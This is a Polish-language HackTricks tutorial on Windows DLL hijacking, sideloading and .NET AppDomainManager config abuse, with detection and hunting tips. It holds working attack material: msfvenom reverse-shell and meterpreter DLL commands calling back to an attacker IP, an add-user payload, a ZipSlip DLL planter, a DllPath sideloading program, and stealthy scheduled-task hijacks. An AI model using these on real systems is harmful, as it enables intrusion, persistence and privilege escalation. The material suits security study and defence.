# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na nakłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest wykorzystywany głównie do wykonywania kodu i uzyskiwania persistence, a rzadziej do privilege escalation. Mimo że w tym miejscu skupiamy się na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Typowe techniki

W przypadku DLL hijacking stosuje się kilka metod, a ich skuteczność zależy od strategii ładowania DLL przez aplikację:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie oryginalnej biblioteki DLL złośliwą wersją, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnej biblioteki DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce wyszukiwania znajdującej się przed ścieżką do legalnej biblioteki, z wykorzystaniem schematu wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, uznając ją za nieistniejącą, wymaganą bibliotekę DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnej biblioteki DLL złośliwym odpowiednikiem w katalogu WinSxS — metoda często kojarzona z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu wraz ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczne DLL sideloading nie jest jedynym sposobem na nakłonienie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **managed**, CLR sprawdza również plik konfiguracji aplikacji o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). Plik ten może definiować niestandardowy **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowany przez atakującego assembly umieszczony obok pliku EXE, CLR załaduje go **przed standardową ścieżką wykonywania aplikacji** i uruchomi wewnątrz zaufanego procesu.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>` muszą być obecne, aby użyć niestandardowego managera.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalny menedżer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktyczne uwagi:
- Jest to tradecraft specyficzny dla **.NET Framework**. Zależy od parsowania konfiguracji CLR, a nie od kolejności wyszukiwania DLL w Win32.
- Host musi być rzeczywiście **managed EXE**. Szybka weryfikacja: `sigcheck -m target.exe`, `corflags target.exe` lub sprawdzenie obecności **CLR Runtime Header** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`) i zwykle znajduje się **obok pliku EXE**.
- Jest to przydatne w przypadku **podpisanych plików binarnych Microsoft/vendor**, ponieważ zaufany EXE pozostaje niezmieniony, podczas gdy złośliwy managed assembly wykonuje się w tym samym procesie.
- Jeśli masz już zapisywalny katalog instalatora/aktualizacji, AppDomainManager hijacking może zostać użyty jako **pierwszy etap**, a następnie można wykorzystać klasyczne DLL sideloading lub reflective loading dla kolejnych etapów.

### AppDomainManager jako downloader + bootstrap scheduled task

Praktyczny schemat intrusion polega na połączeniu zaufanego managed EXE zarówno ze złośliwym `*.config`, jak i ze złośliwą biblioteką DLL AppDomainManager, która pełni wyłącznie funkcję **małego bootstrappera**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia podpisany instalator lub updater .NET z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Sąsiedni plik config powoduje, że CLR ładuje assembly atakującego **przed** rozpoczęciem właściwej logiki aplikacji.
3. Złośliwy manager wykonuje **path gate** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE jest uruchomiony z `Downloads`, a drugi etap może działać wyłącznie z `%LOCALAPPDATA%`).
4. Jeśli weryfikacja zakończy się powodzeniem, pobiera właściwy payload do zapisywalnej przez użytkownika lokalizacji, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia persistence za pomocą scheduled task.

Dlaczego ten wariant ma znaczenie:
- Podpisany host EXE pozostaje niezmieniony, więc triage, który sprawdza wyłącznie hash głównego pliku binarnego, może nie wykryć compromise.
- Proste **path-based anti-analysis** jest powszechne: przeniesienie triady ZIP/EXE/DLL na Desktop, do Temp lub do ścieżki sandboxa może celowo przerwać chain.
- DLL AppDomainManager pierwszego etapu może pozostać mała i generować niewiele szumu, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład persistence często spotykany w tym schemacie:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Uwagi:
- ` /rl highest` oznacza **najwyższy dostępny** poziom dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Ta technika jest często lepiej klasyfikowana jako **execution/persistence via .NET config abuse** niż klasyczne przejęcie kolejności wyszukiwania brakującej DLL, mimo że operatorzy często łączą oba podejścia.

Punkty kontrolne detekcji:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek po ekstrakcji ZIP**, `Downloads`, `%TEMP%` lub innych folderów zapisywalnych przez użytkownika, z **umieszczonym obok** plikiem `<exe>.config`.
- Nowe scheduled tasks, których akcja wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a których nazwy naśladują updatery przeglądarek lub dostawców.
- Krótkotrwałe managed bootstrap processes, które natychmiast pobierają kolejny EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie wcześnie, jeśli ścieżka pliku wykonywalnego nie pasuje do oczekiwanego katalogu profilu użytkownika.

### Przejęcie istniejącego scheduled task w celu ponownego uruchomienia łańcucha sideload

W kontekście persistence nie należy szukać wyłącznie **tworzenia nowego taska**. Niektóre intrusion sets czekają, aż legalny instalator utworzy **normalny updater task**, a następnie **przepisują akcję taska**, aby istniejąca nazwa, autor i trigger nadal wyglądały znajomo dla defenderów.

Możliwy do ponownego wykorzystania workflow:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj task, który zwykle tworzy.
2. Wyeksportuj XML taska i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp wyłącznie akcję, aby task uruchamiał Twój **trusted host EXE** z katalogu staging zapisywalnego przez użytkownika; następnie ten plik wykona side-load lub AppDomain-load właściwego payloadu.
4. Zarejestruj ponownie task pod tą samą nazwą zamiast tworzyć nowy, oczywisty artefakt persistence.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Dlaczego jest to bardziej stealthy:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jako updater dostawcy).
- Uruchamia je usługa **Task Scheduler**, więc walidacja procesu nadrzędnego/przodków często widzi oczekiwany łańcuch harmonogramu zamiast `explorer.exe`.
- Zespoły DFIR, które szukają wyłącznie **nowych nazw zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty polowania:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj XML z `C:\Windows\System32\Tasks\*` oraz metadane z `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z baseline'em.
- Generuj alert, gdy **wyglądające na updater dostawcy zadanie** wykonuje się z **katalogów zapisywalnych przez użytkownika** lub uruchamia .NET EXE z sąsiadującym plikiem `*.config`.

> [!TIP]
> Aby zobaczyć szczegółowy łańcuch, który łączy HTML staging, konfiguracje AES-CTR i .NET implants z DLL sideloading, zapoznaj się z poniższym workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących DLL

Najczęstszym sposobem znalezienia brakujących DLL wewnątrz systemu jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals i **ustawienie** **poniższych 2 filtrów**:

![Common Techniques - Znajdowanie brakujących DLL: Najczęstszym sposobem znalezienia brakujących DLL wewnątrz systemu jest uruchomienie procmon z sysinternals i ustawienie poniższych 2 filtrów](<../../../images/image (961).png>)

![Common Techniques - Znajdowanie brakujących DLL: Najczęstszym sposobem znalezienia brakujących DLL wewnątrz systemu jest uruchomienie procmon z sysinternals i ustawienie poniższych 2 filtrów](<../../../images/image (230).png>)

i wyświetlenie tylko **File System Activity**:

![Common Techniques - Znajdowanie brakujących DLL: i wyświetlenie tylko File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **brakujących DLL ogólnie**, **pozostaw** to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL wewnątrz konkretnego pliku wykonywalnego**, ustaw **inny filtr, taki jak "Process Name" "contains" `<exec name>`, uruchom go i zatrzymaj przechwytywanie zdarzeń**.<sup>[[9]](#references)</sup>

## Wykorzystanie brakujących DLL

Aby eskalować uprawnienia, największą szansę daje możliwość **zapisania DLL, którą uprzywilejowany proces będzie próbował załadować** w jednym z **miejsc, w których będzie ona wyszukiwana**. Dzięki temu będziemy mogli **zapisać** DLL w **folderze**, w którym **DLL jest wyszukiwana wcześniej** niż w folderze zawierającym **oryginalną DLL** (rzadki przypadek), albo będziemy mogli **zapisać ją w folderze, w którym DLL będzie wyszukiwana**, a oryginalna **DLL nie istnieje** w żadnym folderze.

### Kolejność wyszukiwania DLL

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **znajdziesz informacje o tym, jak dokładnie ładowane są DLL.**

**Aplikacje Windows** szukają DLL, korzystając z zestawu **predefiniowanych ścieżek** i przestrzegając określonej kolejności. Problem DLL hijacking pojawia się, gdy szkodliwa DLL zostanie strategicznie umieszczona w jednym z tych katalogów, dzięki czemu zostanie załadowana przed autentyczną DLL. Sposobem zapobiegania temu jest upewnienie się, że aplikacja używa ścieżek absolutnych podczas odwoływania się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę tego katalogu.(_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie istnieje funkcja uzyskująca ścieżkę tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Należy pamiętać, że nie obejmuje to ścieżki określonej dla aplikacji przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany podczas obliczania ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonej funkcji **SafeDllSearchMode**. Gdy jest wyłączona, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie funkcja jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z parametrem **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpoczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec należy pamiętać, że **DLL może zostać załadowana ze wskazaniem ścieżki absolutnej, a nie tylko nazwy**. W takim przypadku DLL będzie **wyszukiwana wyłącznie w tej ścieżce** (jeśli DLL ma zależności, będą one wyszukiwane tak, jakby zostały załadowane wyłącznie po nazwie).

Istnieją inne sposoby zmiany sposobu modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj wyjaśniać.

### Łączenie arbitralnego zapisu pliku z hijackingiem brakującej DLL

1. Użyj filtrów **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli binary działa zgodnie z **harmonogramem lub jako usługa**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (wpis nr 1 w kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem prawdziwej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym exportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli Twoim primitive jest **arbitrary write w stylu ZipSlip**, przygotuj ZIP, którego wpis wychodzi poza katalog ekstrakcji, tak aby DLL trafiła do folderu aplikacji:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do monitorowanej skrzynki odbiorczej/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on złośliwą bibliotekę DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem deterministycznego wpływania na ścieżkę wyszukiwania biblioteki DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając kontrolowany przez atakującego katalog, można zmusić proces docelowy, który rozwiązuje importowaną bibliotekę DLL na podstawie nazwy (bez ścieżki absolutnej i bez użycia bezpiecznych flag ładowania), do załadowania złośliwej biblioteki DLL z tego katalogu.

Key idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardową wartość DllPath wskazującą na kontrolowany przez Ciebie folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy plik binarny docelowego procesu będzie rozwiązywał bibliotekę DLL na podstawie nazwy, loader uwzględni podaną wartość DllPath podczas rozwiązywania, umożliwiając niezawodny sideloading nawet wtedy, gdy złośliwa biblioteka DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Notes/limitations
- Dotyczy to tworzonego procesu potomnego; różni się od SetDllDirectory, które wpływa wyłącznie na bieżący proces.
- Proces docelowy musi importować bibliotekę DLL lub wywoływać LoadLibrary z nazwą biblioteki (bez ścieżki absolutnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane na stałe ścieżki absolutne nie mogą zostać przejęte. Forwarded exports i SxS mogą zmienić kolejność pierwszeństwa.

Minimalny przykład w C (ntdll, szerokie ciągi znaków, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie sideloadingu DLL przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Umieść złośliwy plik xmllite.dll (eksportujący wymagane funkcje lub proxy do prawdziwego pliku) w swoim katalogu DllPath.
- Uruchom podpisany binary, o którym wiadomo, że wyszukuje plik xmllite.dll po nazwie, korzystając z powyższej techniki. Loader rozwiąże import za pomocą podanego DllPath i wykona sideloading Twojego DLL.

Technikę tę obserwowano in-the-wild w łańcuchach sideloadingu składających się z wielu etapów: początkowy launcher upuszcza pomocniczy DLL, który następnie uruchamia podpisany przez Microsoft binary podatny na hijacking, z niestandardowym DllPath wymuszającym załadowanie DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking przez `.exe.config`

W przypadku celów **.NET Framework** sideloading może zostać wykonany **przed `Main()`** bez patchowania pamięci, poprzez wykorzystanie sąsiadującego pliku **`.exe.config`** aplikacji. Zamiast polegać wyłącznie na kolejności wyszukiwania DLL Win32, atakujący umieszcza legalny .NET EXE obok złośliwego configu oraz jednego lub większej liczby assemblies kontrolowanych przez atakującego.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE uruchamia się, a **CLR odczytuje `<exe>.config`**.
2. Config ustawia **`<appDomainManagerAssembly>`** oraz **`<appDomainManagerType>`**, aby runtime utworzył kontrolowany przez atakującego `AppDomainManager`.
3. Złośliwy manager uzyskuje **wykonanie przed `Main()`** wewnątrz zaufanego procesu hosta.
4. Ten sam config może wymusić, aby CLR w pierwszej kolejności rozwiązywał lokalne assemblies (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację runtime i telemetry bez inline patchingu.

Wzorzec w stylu kampanii (dokładne zagnieżdżenie może różnić się w zależności od dyrektywy / wersji CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** utrzymuje rozwiązywanie assembly w katalogu aplikacji, zamieniając folder w przewidywalną powierzchnię sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się właściwa logika aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji full-trust załadować niepodpisane lub zmodyfikowane assembly bez błędu walidacji strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom publisher-policy do nowszych assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sprawia, że wybór runtime jest bardziej deterministyczny.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** z poziomu konfiguracji, zamiast patchowania przez implant `EtwEventWrite` w pamięci.

Schemat operacyjny obserwowany w ostatnich kampaniach:
- Etap 1 umieszcza `setup.exe`, `setup.exe.config` oraz lokalne assembly.
- Etap 2 kopiuje je do wiarygodnego folderu **AppData update**, zmienia nazwę hosta na coś w rodzaju `update.exe`, a następnie uruchamia go ponownie za pomocą **scheduled task**.
- Etap 3 weryfikuje kontekst wykonania, na przykład oczekiwanego rodzica `svchost.exe` z Task Scheduler, zanim załaduje końcowy plik DLL/export RAT.

Pomysły na hunting:
- Podpisane lub w inny sposób legalne **pliki wykonywalne .NET**, uruchamiane z podejrzanymi sąsiadującymi plikami **`.config`** w lokalizacjach z prawem zapisu dla użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Scheduled tasks ponownie uruchamiające zmienione nazwy plików update z **`%LOCALAPPDATA%`** lub właściwych dla aplikacji katalogów `\bin\update\`.
- Łańcuchy rodzic/dziecko, w których scheduled task uruchamia zaufany host .NET, który natychmiast ładuje assembly spoza dostawcy z własnego katalogu.

#### Wyjątki od kolejności wyszukiwania dll na podstawie dokumentacji Windows

W dokumentacji Windows opisano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **DLL o tej samej nazwie co DLL już załadowany w pamięci**, system pomija standardowe wyszukiwanie. Zamiast tego sprawdza przekierowanie i manifest, a następnie domyślnie używa DLL znajdującego się już w pamięci. **W tym scenariuszu system nie wyszukuje DLL**.
- Jeśli DLL jest rozpoznawany jako **known DLL** dla bieżącej wersji Windows, system użyje swojej wersji known DLL wraz ze wszystkimi zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL odbywa się tak, jakby zostały wskazane wyłącznie za pomocą ich **nazw modułów**, niezależnie od tego, czy początkowy DLL został zidentyfikowany przy użyciu pełnej ścieżki.

### Escalating Privileges

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub lateral movement), a któremu **brakuje DLL**.
- Upewnij się, że dostępny jest **zapis** do dowolnego **katalogu**, w którym będzie **wyszukiwany DLL**. Może to być katalog pliku wykonywalnego lub katalog znajdujący się w ścieżce systemowej.

Tak, wymagania są trudne do spełnienia, ponieważ **domyślnie dość dziwne jest znalezienie uprzywilejowanego pliku wykonywalnego, któremu brakuje dll**, a jeszcze **dziwniejsze jest posiadanie uprawnień zapisu do folderu w ścieżce systemowej** (domyślnie nie jest to możliwe). Jednak w nieprawidłowo skonfigurowanych środowiskach jest to możliwe.\
Jeśli masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Mimo że **głównym celem projektu jest bypass UAC**, możesz znaleźć tam **PoC** Dll hijaking dla danej wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, do którego masz uprawnienia zapisu).

Pamiętaj, że możesz **sprawdzić swoje uprawnienia do folderu**, wykonując:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów wewnątrz PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego oraz eksporty biblioteki DLL za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny poradnik dotyczący **abuse Dll Hijacking w celu eskalacji uprawnień** z uprawnieniami do zapisu w folderze **System Path**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia zapisu w dowolnym folderze znajdującym się w systemowym PATH.\
Innymi interesującymi automated tools do wykrywania tej podatności są funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll._

### Example

Jeśli znajdziesz exploitable scenario, jedną z najważniejszych rzeczy niezbędnych do jego skutecznego wykorzystania będzie **utworzenie dll, która eksportuje co najmniej wszystkie funkcje importowane z niej przez executable**. Należy jednak pamiętać, że Dll Hijacking jest przydatny do [**eskalacji z poziomu Medium Integrity do High (bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z poziomu[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **jak utworzyć poprawną dll** znajdziesz w tym opracowaniu dotyczącym dll hijacking, skoncentrowanym na dll hijacking do execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **templates** lub do utworzenia **dll z wyeksportowanymi funkcjami, które nie są wymagane**.

## **Tworzenie i kompilowanie Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll zdolna do **wykonania złośliwego kodu po załadowaniu**, a jednocześnie do **udostępniania** i **działania** zgodnie z **oczekiwaniami**, poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz wskazać executable i wybrać bibliotekę, którą chcesz proxify, a następnie **wygenerować proxified dll**, lub **wskazać Dll** i **wygenerować proxified dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86, nie znalazłem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własne

Pamiętaj, że w kilku przypadkach skompilowana przez Ciebie biblioteka Dll musi **eksportować kilka funkcji**, które zostaną załadowane przez proces ofiary. Jeśli te funkcje nie istnieją, **plik binarny nie będzie mógł ich załadować**, a **exploit zakończy się niepowodzeniem**.

<details>
<summary>Szablon C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
